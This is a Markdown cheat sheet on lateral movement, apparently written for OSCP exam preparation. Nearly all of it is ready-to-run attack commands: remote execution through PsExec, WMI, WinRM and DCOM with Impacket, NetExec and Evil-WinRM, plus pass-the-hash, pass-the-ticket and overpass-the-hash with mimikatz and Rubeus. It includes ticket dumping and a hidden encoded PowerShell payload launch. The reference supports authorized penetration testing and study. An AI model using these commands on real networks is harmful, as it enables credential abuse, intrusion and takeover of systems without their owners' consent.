# Lateral Movement

## Table of Contents

- [Windows Lateral Movement](#windows-lateral-movement)
  - [PsExec](#psexec)
  - [WMI](#wmi)
  - [WinRM](#winrm)
  - [DCOM](#dcom)
  - [Pass the Hash (PtH)](#pass-the-hash-pth)
  - [Pass the Ticket (PtT)](#pass-the-ticket-ptt)
  - [Overpass the Hash](#overpass-the-hash)
- [Linux Lateral Movement](#linux-lateral-movement)
  - [SSH](#ssh)
- [Port Forwarding & Pivoting](#port-forwarding--pivoting)

---

## Windows Lateral Movement

### PsExec

#### Sysinternals PsExec

```cmd
.\PsExec64.exe -i \\$rhost -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
.\PsExec64.exe \\$rhost cmd
```

#### Impacket PsExec

```shell
impacket-psexec <USERNAME>@$rhost
impacket-psexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-psexec $domain/Administrator@$rhost -hashes :<NTLM_HASH>
```

---

### WMI

#### Windows Management Instrumentation

```cmd
wmic /node:$rhost /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

#### PowerShell WMI

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $rhost -Credential $credential -SessionOption $Options 
$command = 'cmd /c whoami';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### Impacket WMIExec

```shell
impacket-wmiexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
```

---

### WinRM

#### Windows Remote Shell

```cmd
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:$rhost -u:<USERNAME> -p:<PASSWORD> "powershell -ep bypass -c whoami"
```

#### PowerShell Remoting

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName $rhost -Credential $credential
Enter-PSSession 1
```

#### Evil-WinRM

```shell
evil-winrm -i $rhost -u <USERNAME> -p <PASSWORD>
evil-winrm -i $rhost -u <USERNAME> -H <NTLM_HASH>
evil-winrm -i $rhost -c certificate.crt -k key.key -S
```

---

### DCOM

#### Distributed Component Object Model

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$rhost"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
```

#### Impacket DCOMExec

```shell
impacket-dcomexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-dcomexec -object MMC20 -silentcommand $domain/<USERNAME>:<PASSWORD>@$rhost '<COMMAND>'
```

---

### Pass the Hash (PtH)

> Use NTLM hash for authentication

#### Impacket

```shell
impacket-psexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
impacket-smbexec -hashes :<NTLM_HASH> Administrator@$rhost
```

#### NetExec

```shell
netexec smb $rhost -u Administrator -H <NTLM_HASH>
netexec smb $rhost -u Administrator -H <NTLM_HASH> -x "whoami"
netexec winrm $rhost -u Administrator -H <NTLM_HASH>
```

#### Evil-WinRM (PtH)

```shell
evil-winrm -i $rhost -u Administrator -H <NTLM_HASH>
```

---

### Pass the Ticket (PtT)

> Use Kerberos ticket for authentication

#### Export Tickets (mimikatz)

```cmd
sekurlsa::tickets /export
dir *.kirbi
```

#### Inject Ticket (mimikatz)

```cmd
kerberos::ptt <TICKET>.kirbi
```

#### Inject Ticket (Rubeus)

```cmd
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
```

#### Linux

```shell
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
```

---

### Overpass the Hash

> Use NTLM hash to request Kerberos ticket

#### mimikatz

```cmd
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
```

#### Impacket (Overpass)

```shell
impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
```

---

## Linux Lateral Movement

### SSH

```shell
ssh <USERNAME>@$rhost
ssh -i id_rsa <USERNAME>@$rhost
ssh -o StrictHostKeyChecking=no <USERNAME>@$rhost
```

#### SSH with Password

```shell
sshpass -p '<PASSWORD>' ssh <USERNAME>@$rhost
```

---

## Port Forwarding & Pivoting

> For detailed port forwarding, pivoting, and tunneling techniques (Chisel, Ligolo-ng, SSH Tunneling, Socat, ProxyChains, sshuttle, Metasploit Pivoting), see:
>
> **[Pivoting & Tunneling Cheatsheet](5.2.Pivoting-Tunneling.md)**

---

## See Also

### Related AD Files

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - ACL Abuse, GPO Abuse, AD CS attacks
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - Hash cracking, credential extraction
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync, Delegation
- **[NTLM Relay & Responder](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM Relay, PTH details

### Pivoting & Tunneling

- **[Pivoting & Tunneling](5.2.Pivoting-Tunneling.md)** - Chisel, ProxyChains, SSH Tunnels
- **[Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)** - Single/multi-hop pivoting

### Privilege Escalation

- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Escalate before pivoting
- **[Linux Privilege Escalation](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Linux privesc techniques

### OSCP Preparation

- **[OSCP Exam Guide](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md)** - Complete exam methodology
